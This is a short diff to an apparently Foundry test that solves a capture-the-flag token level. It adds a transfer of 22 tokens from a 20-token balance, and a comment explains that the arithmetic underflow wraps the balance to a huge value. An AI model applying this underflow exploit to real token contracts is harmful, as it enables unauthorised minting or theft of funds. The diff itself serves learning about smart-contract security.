@@ -38,6 +38,10 @@ contract TestToken is BaseTest {
 
         vm.startPrank(player, player);
 
+        //Arithmetic Underflow. We have 20 tokens, we send 22. It will wrap back around at following balance:
+        //115792089237316195423570985008687907853269984665640564039457584007913129639934
+        level.transfer(owner, 22);
+
         vm.stopPrank();
     }
 }
